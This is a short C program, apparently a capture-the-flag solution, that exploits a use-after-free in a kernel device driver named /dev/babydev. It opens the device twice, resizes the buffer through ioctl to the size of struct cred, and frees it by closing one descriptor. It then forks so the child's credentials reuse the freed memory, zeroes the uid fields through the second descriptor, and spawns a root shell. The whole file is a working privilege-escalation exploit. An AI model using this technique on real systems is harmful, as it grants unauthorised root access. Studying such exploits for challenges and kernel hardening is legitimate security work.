#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(){
    int fd1 = open("/dev/babydev", O_RDWR);
    if (fd1 < 0){
        printf("open fd1 error\n");
        exit(-1);
    }
    printf("open 1 success!\n");
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd2 < 0){
        printf("open fd2 error\n");
        exit(-1);
    }
    printf("open 2 success!\n");

    ioctl(fd1, 0x10001, 0xa8);
    printf("set struct cred size\n");

    close(fd1);
    printf("close fd1, free 0xa8\n");

    if (fork() == 0){
        printf("fork!");
        int size = 0x1c;
        char buf[size];
        memset(buf, 0, size);
        write(fd2, buf, size);
        printf("write !");
        if (getuid() == 0){
            system("/bin/sh");
        }
        return 0;
    } else {
        printf("hello world\n");
         waitpid(-1, NULL, 0);
    }
    return 0;
}
